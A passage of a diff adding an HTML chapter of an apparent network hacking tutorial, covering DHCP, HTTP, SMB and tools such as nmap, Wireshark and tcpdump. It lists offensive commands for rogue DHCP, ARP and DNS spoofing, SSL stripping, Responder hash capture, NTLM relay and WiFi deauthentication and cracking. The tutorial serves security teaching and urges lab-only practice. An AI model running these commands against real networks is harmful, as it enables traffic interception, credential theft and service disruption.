+hping3 -1 -a 192.168.1.100 192.168.1.255  # Spoofed ping to broadcast</div>
+
+            <h3>DHCP - Dynamic Host Configuration Protocol</h3>
+            <p>DHCP automatically assigns IP addresses, gateways, and DNS servers to devices. It makes networks "plug and play" - but also trusting and exploitable.</p>
+
+            <div class="code"># DHCP Process (DORA):
+
+1. DISCOVER - Client broadcasts: "I need an IP!"
+   Src: 0.0.0.0:68 → Dst: 255.255.255.255:67
+   
+2. OFFER - DHCP server offers configuration:
+   "You can have 192.168.1.100"
+   
+3. REQUEST - Client requests the offered IP:
+   "I'll take 192.168.1.100"
+   
+4. ACK - Server acknowledges:
+   "192.168.1.100 is yours for 24 hours"
+   Also provides: Gateway, DNS, subnet mask
+
+# Client now has:
+IP: 192.168.1.100
+Gateway: 192.168.1.1
+DNS: 192.168.1.1 (or ISP's DNS)
+Subnet: 255.255.255.0
+Lease time: 86400 seconds</div>
+
+            <h3>DHCP Attacks</h3>
+            <div class="code"># DHCP Starvation Attack:
+# Request ALL available IP addresses
+# Legitimate users can't get IPs
+# Tools: Yersinia, dhcpig
+
+yersinia -G                    # GUI mode
+dhcpig -i eth0                 # Exhaust DHCP pool
+
+# Rogue DHCP Server Attack:
+# Set up your own DHCP server
+# Race to respond faster than legitimate server
+# Hand out YOUR configuration:
+#   - YOUR IP as the gateway (MITM!)
+#   - YOUR IP as DNS server (DNS spoofing!)
+
+# Using dnsmasq as rogue DHCP:
+dnsmasq --interface=eth0 \
+        --dhcp-range=192.168.1.100,192.168.1.200 \
+        --dhcp-option=3,192.168.1.50 \    # Gateway = attacker
+        --dhcp-option=6,192.168.1.50       # DNS = attacker
+
+# Now all new clients route through you!</div>
+
+            <h3>HTTP/HTTPS Protocols</h3>
+            <p>HTTP is the foundation of web communication. Understanding it is essential for web hacking.</p>
+
+            <div class="code"># HTTP Request Structure:
+GET /login.php HTTP/1.1
+Host: www.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/xhtml+xml
+Accept-Language: en-US,en;q=0.9
+Cookie: session_id=abc123; user=john
+Connection: keep-alive
+
+[blank line]
+[optional body for POST requests]
+
+# HTTP Response Structure:
+HTTP/1.1 200 OK
+Date: Sat, 14 Dec 2024 12:00:00 GMT
+Server: Apache/2.4.41
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1234
+Set-Cookie: session_id=xyz789; HttpOnly; Secure
+
+<!DOCTYPE html>
+<html>
+...
+
+# Important HTTP Methods:
+GET     - Retrieve resource (parameters in URL)
+POST    - Submit data (parameters in body)
+PUT     - Update/create resource
+DELETE  - Delete resource
+HEAD    - GET without body (just headers)
+OPTIONS - What methods are allowed?
+PATCH   - Partial update
+TRACE   - Echo back request (XST attacks)
+
+# Important Status Codes:
+200 - OK
+301 - Moved Permanently (redirect)
+302 - Found (temporary redirect)
+400 - Bad Request
+401 - Unauthorized
+403 - Forbidden
+404 - Not Found
+500 - Internal Server Error
+502 - Bad Gateway
+503 - Service Unavailable</div>
+
+            <h3>SMB - Server Message Block</h3>
+            <p>SMB is Windows' file sharing protocol. It's been the source of devastating vulnerabilities like EternalBlue (WannaCry ransomware).</p>
+
+            <div class="code"># SMB Ports:
+139 - NetBIOS Session Service (SMB over NetBIOS)
+445 - SMB directly over TCP
+
+# SMB Enumeration:
+smbclient -L //192.168.1.1     # List shares
+smbclient //192.168.1.1/share  # Connect to share
+
+# Null session (no authentication):
+smbclient -L //192.168.1.1 -N
+
+# Using enum4linux:
+enum4linux 192.168.1.1
+
+# Using smbmap:
+smbmap -H 192.168.1.1
+smbmap -H 192.168.1.1 -u '' -p ''  # Null session
+
+# Check for EternalBlue vulnerability:
+nmap -p 445 --script smb-vuln-ms17-010 192.168.1.1
+
+# CrackMapExec - Swiss army knife for SMB:
+crackmapexec smb 192.168.1.0/24          # Scan network
+crackmapexec smb 192.168.1.1 -u '' -p '' # Null session
+crackmapexec smb 192.168.1.1 -u user -p password --shares</div>
+
+            <div class="info-box">
+                <h4>SMB Attack Vectors</h4>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Null sessions:</strong> Anonymous access to shares and user lists</li>
+                    <li><strong>Password spraying:</strong> Try common passwords across users</li>
+                    <li><strong>Pass-the-hash:</strong> Use NTLM hashes without cracking</li>
+                    <li><strong>EternalBlue:</strong> Remote code execution (MS17-010)</li>
+                    <li><strong>SMB Relay:</strong> Relay authentication to another host</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="tools" class="section">
+            <h2 class="section-title">Essential Networking Tools</h2>
+            <p class="section-intro">Master these tools and you can analyze, attack, and defend any network. These are the essential tools every network hacker must know inside and out.</p>
+
+            <h3>Reconnaissance & Scanning Tools</h3>
+
+            <h4>🔍 Nmap - The King of Port Scanners</h4>
+            <p>Nmap is the most important reconnaissance tool. It discovers hosts, scans ports, detects services, and even finds vulnerabilities.</p>
+
+            <div class="code"># Host Discovery:
+nmap -sn 192.168.1.0/24           # Ping sweep - find live hosts
+nmap -Pn 192.168.1.1              # Skip ping - assume host is up
+nmap -PS22,80,443 192.168.1.1     # TCP SYN ping on specific ports
+nmap -PA80 192.168.1.1            # TCP ACK ping
+nmap -PU53 192.168.1.1            # UDP ping
+
+# Port Scanning Techniques:
+nmap -sT 192.168.1.1    # TCP Connect scan (completes handshake, logged)
+nmap -sS 192.168.1.1    # SYN scan (stealthy, half-open) [default, needs root]
+nmap -sU 192.168.1.1    # UDP scan (slow but important!)
+nmap -sA 192.168.1.1    # ACK scan (detect firewall rules)
+nmap -sN 192.168.1.1    # NULL scan (no flags, evades some firewalls)
+nmap -sF 192.168.1.1    # FIN scan (only FIN flag)
+nmap -sX 192.168.1.1    # Xmas scan (FIN+PSH+URG flags)
+
+# Port Specification:
+nmap -p 80 192.168.1.1            # Single port
+nmap -p 80,443,8080 192.168.1.1   # Multiple ports
+nmap -p 1-1000 192.168.1.1        # Port range
+nmap -p- 192.168.1.1              # ALL 65535 ports (slow but thorough!)
+nmap --top-ports 100 192.168.1.1  # Top 100 most common ports
+
+# Service & Version Detection:
+nmap -sV 192.168.1.1              # Version detection
+nmap -sV --version-intensity 5    # Aggressive version detection
+nmap -sC 192.168.1.1              # Default scripts
+nmap -A 192.168.1.1               # Aggressive: OS + versions + scripts + traceroute
+
+# OS Detection:
+nmap -O 192.168.1.1               # OS fingerprinting
+
+# Timing & Performance:
+nmap -T0 192.168.1.1    # Paranoid (IDS evasion, very slow)
+nmap -T1 192.168.1.1    # Sneaky (IDS evasion)
+nmap -T2 192.168.1.1    # Polite (low bandwidth)
+nmap -T3 192.168.1.1    # Normal (default)
+nmap -T4 192.168.1.1    # Aggressive (faster)
+nmap -T5 192.168.1.1    # Insane (fastest, may miss ports)
+
+# NSE Scripts:
+nmap --script vuln 192.168.1.1                    # Vulnerability scripts
+nmap --script "http-*" 192.168.1.1                # All HTTP scripts
+nmap --script smb-vuln-ms17-010 192.168.1.1       # Check for EternalBlue
+nmap --script http-enum 192.168.1.1               # HTTP enumeration
+nmap --script ssl-heartbleed 192.168.1.1          # Check for Heartbleed
+
+# Output Formats:
+nmap -oN output.txt 192.168.1.1    # Normal output
+nmap -oX output.xml 192.168.1.1    # XML output
+nmap -oG output.gnmap 192.168.1.1  # Grepable output
+nmap -oA output 192.168.1.1        # All formats at once
+
+# Pro Tip Combinations:
+nmap -sS -sV -sC -O -T4 -p- -oA full_scan 192.168.1.1
+# SYN scan, version detection, default scripts, OS detection, fast timing, all ports</div>
+
+            <h4>🦈 Wireshark - Packet Analyzer</h4>
+            <p>Wireshark captures and analyzes all network traffic in real-time. Essential for understanding what's happening on the wire.</p>
+
+            <div class="code"># Start Wireshark:
+wireshark                         # GUI
+tshark -i eth0                    # Command line version
+
+# Common Capture Filters (before capture):
+host 192.168.1.1                  # Traffic to/from specific host
+port 80                           # Traffic on specific port
+src 192.168.1.100                 # Traffic from source
+dst 192.168.1.1                   # Traffic to destination
+tcp                               # Only TCP
+udp port 53                       # Only DNS (UDP 53)
+
+# Common Display Filters (after capture):
+ip.addr == 192.168.1.1            # Traffic to/from IP
+ip.src == 192.168.1.100           # From specific source
+ip.dst == 8.8.8.8                 # To specific destination
+tcp.port == 80                    # TCP port 80
+http                              # Only HTTP traffic
+dns                               # Only DNS
+tcp.flags.syn == 1                # SYN packets (new connections)
+http.request.method == "POST"     # Only POST requests
+frame contains "password"         # Packets containing "password"
+
+# Following Streams:
+Right-click packet → Follow → TCP Stream    # See full conversation
+Right-click packet → Follow → HTTP Stream   # Reconstructed HTTP
+
+# Extract files:
+File → Export Objects → HTTP      # Extract downloaded files
+
+# Colorize:
+View → Coloring Rules             # Color code different traffic
+
+# Practical uses:
+# - Capture credentials from unencrypted traffic
+# - Analyze malware communication
+# - Debug network issues
+# - Learn how protocols work
+# - Verify your own tools are working</div>
+
+            <h4>🖥️ Tcpdump - Command-Line Packet Capture</h4>
+            <div class="code"># Basic capture:
+tcpdump -i eth0                   # Capture on interface
+tcpdump -i any                    # All interfaces
+
+# Filter examples:
+tcpdump -i eth0 host 192.168.1.1  # Specific host
+tcpdump -i eth0 port 80           # Specific port
+tcpdump -i eth0 src 192.168.1.100 # From source
+tcpdump -i eth0 dst port 443      # To destination port
+
+# Output options:
+tcpdump -w capture.pcap           # Write to file
+tcpdump -r capture.pcap           # Read from file
+tcpdump -n                        # Don't resolve hostnames
+tcpdump -nn                       # Don't resolve hostnames or ports
+tcpdump -v                        # Verbose
+tcpdump -vvv                      # Very verbose
+tcpdump -X                        # Show packet contents in hex and ASCII
+
+# Combine filters:
+tcpdump -i eth0 'port 80 and host 192.168.1.1'
+tcpdump -i eth0 'tcp port 22 or tcp port 80'
+tcpdump -i eth0 'not port 22'     # Exclude SSH</div>
+
+            <h3>Attack Tools</h3>
+
+            <h4>🎯 Bettercap - Modern Network Attack Framework</h4>
+            <div class="code"># Start bettercap:
+bettercap -iface eth0
+
+# Interactive mode commands:
+> help                            # List all commands
+> net.probe on                    # Discover hosts on network
+> net.show                        # Show discovered hosts
+
+# ARP Spoofing:
+> set arp.spoof.targets 192.168.1.100    # Target specific host
+> set arp.spoof.fullduplex true          # Intercept both directions
+> arp.spoof on                           # Start ARP spoofing
+
+# Packet Sniffing:
+> net.sniff on                           # Capture traffic
+
+# DNS Spoofing:
+> set dns.spoof.domains *.google.com     # Domains to spoof
+> set dns.spoof.address 192.168.1.50     # Where to redirect
+> dns.spoof on                           # Start DNS spoofing
+
+# HTTPS Downgrade (SSL stripping):
+> set http.proxy.sslstrip true
+> http.proxy on
+
+# Credential Harvesting:
+> set http.proxy.script /path/to/script.js
+> http.proxy on
+
+# Caplets (automation scripts):
+bettercap -caplet spoof.cap              # Run caplet file</div>
+
+            <h4>🔓 Responder - Windows Credential Harvester</h4>
+            <div class="code"># Responder poisons LLMNR, NBT-NS, and MDNS
+# When Windows can't resolve a name, it broadcasts
+# Responder answers: "I'm that server!" and captures creds
+
+responder -I eth0                 # Start Responder
+responder -I eth0 -wrf            # Include WPAD, with force
+
+# Captured hashes go to logs/
+# Crack with hashcat:
+hashcat -m 5600 hash.txt wordlist.txt    # NTLMv2
+
+# Use with ntlmrelayx for relay attacks:
+ntlmrelayx.py -tf targets.txt -smb2support</div>
+
+            <h4>📡 Aircrack-ng Suite - WiFi Hacking</h4>
+            <div class="code"># Put interface in monitor mode:
+airmon-ng start wlan0
+
+# Scan for networks:
+airodump-ng wlan0mon
+
+# Target specific network:
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauth attack (force handshake):
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+
+# Crack WPA2:
+aircrack-ng -w wordlist.txt capture-01.cap
+
+# PMKID Attack (clientless):
+hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng
+hcxpcapngtool -o hash.txt capture.pcapng
+hashcat -m 22000 hash.txt wordlist.txt</div>
+
+            <h3>Information Gathering Tools</h3>
+            <div class="code"># netcat - Swiss Army knife
+nc -lvnp 4444                     # Listen on port 4444
+nc 192.168.1.1 80                 # Connect to port 80
+nc -zv 192.168.1.1 1-1000         # Port scan
+
+# curl - HTTP requests
+curl http://192.168.1.1           # GET request
+curl -X POST -d "data" http://..  # POST request
+curl -I http://192.168.1.1        # Headers only
+curl -k https://...               # Ignore cert errors
+
+# dig - DNS queries
+dig google.com                    # A record
+dig +short google.com             # Just the IP
+dig @8.8.8.8 google.com           # Query specific server
+
+# whois - Domain info
+whois google.com
+
+# traceroute - Path to target
+traceroute 8.8.8.8
+
+# netstat / ss - Network connections
+netstat -tlnp                     # Listening TCP ports
+ss -tlnp                          # Same, modern tool
+
+# arp - ARP table
+arp -a                            # Show ARP cache</div>
+
+            <div class="info-box">
+                <h4>⚖️ Practice Legally!</h4>
+                <p>Only use these tools on networks you own or have explicit permission to test. Unauthorized network scanning and attacks are illegal in most jurisdictions and can result in:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Criminal charges under computer fraud laws</li>
+                    <li>Civil lawsuits for damages</li>
+                    <li>Termination of employment</li>
+                    <li>Permanent ban from the security industry</li>
+                </ul>
+                <p style="margin-top: 1rem;"><strong>Legal ways to practice:</strong></p>
+                <ul>
+                    <li>Set up your own lab with virtual machines</li>
+                    <li>Use intentionally vulnerable VMs (Metasploitable, DVWA)</li>
+                    <li>Participate in CTF competitions</li>
+                    <li>Use platforms like HackTheBox, TryHackMe</li>
+                    <li>Get written permission for authorized testing</li>
+                </ul>
+            </div>
+
+            <h3>Building Your Network Hacking Lab</h3>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>VirtualBox/VMware</h4>
+                    <p>Run multiple virtual machines to simulate networks. Create isolated networks for safe testing.</p>
+                </div>
+                <div class="card">
+                    <h4>Kali Linux</h4>
+                    <p>Pre-loaded with all the tools mentioned here. The go-to distro for penetration testing.</p>
+                </div>
+                <div class="card">
+                    <h4>Metasploitable</h4>
+                    <p>Intentionally vulnerable Linux VM. Perfect target for practicing network attacks.</p>
+                </div>
+                <div class="card">
+                    <h4>Windows VMs</h4>
+                    <p>Set up Windows Server and clients to practice Active Directory attacks, SMB exploits, etc.</p>
+                </div>
+            </div>
+        </section>
+
+        <div style="margin-top: 6rem; padding-top: 3rem; border-top: 1px solid var(--border); display: flex; justify-content: space-between;">
+            <a href="hacking-ch01.html" style="color: var(--text2); text-decoration: none;">← Chapter 01: Computer Fundamentals</a>
+            <a href="hacking-ch03.html" style="color: var(--text); text-decoration: none; font-weight: 600;">Next: Chapter 03 - Linux Mastery →</a>
         </div>
-    </section>
+    </main>
 
-    <script src="script.js"></script>
-    
-    <!-- Supabase Client & Auth -->
-    </body>
+    <script>
+        window.addEventListener('scroll', () => {
+            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const scrolled = (winScroll / height) * 100;
+            document.getElementById('progress').style.width = scrolled + '%';
+        });
+
+        const sections = document.querySelectorAll('.section');
+        const sidebarLinks = document.querySelectorAll('.sidebar-link');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (scrollY >= (sectionTop - 150)) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            sidebarLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === `#${current}`) {
+                    link.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
 </html>
-
-
